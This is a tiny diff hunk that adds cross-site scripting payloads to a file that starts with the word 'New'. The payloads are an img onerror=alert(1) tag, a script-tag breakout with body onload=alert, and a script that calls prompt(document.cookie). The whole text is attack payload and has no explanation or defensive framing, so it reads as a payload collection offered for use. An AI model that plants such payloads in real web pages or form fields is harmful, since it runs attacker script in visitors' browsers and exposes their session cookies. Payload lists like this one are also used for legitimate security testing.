@@ -1,4 +1,6 @@
 New
+<img/src/onerror=alert(1)>
+</script><body/onload=alert(`rivu`)>
 ;</script><script>prompt(document.cookie)</script>;//{"
 
 
